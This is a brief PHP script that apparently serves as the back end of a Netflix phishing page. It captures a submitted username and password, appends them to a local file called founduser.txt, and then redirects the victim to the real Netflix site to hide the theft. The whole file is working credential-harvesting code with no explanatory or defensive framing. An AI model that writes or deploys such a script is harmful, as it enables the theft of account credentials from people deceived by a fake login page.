<?php
 $user = $_POST["user"];
 $pass = $_POST["passwo"];

 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $user\n";
 $pa = "Password: $pass\n";
 fwrite($fileuser, "\n". $co. $us. $pa. $cl);
 fclose($fileuser);
 header('Location: https://netflix.com/'); 
 exit()
?>

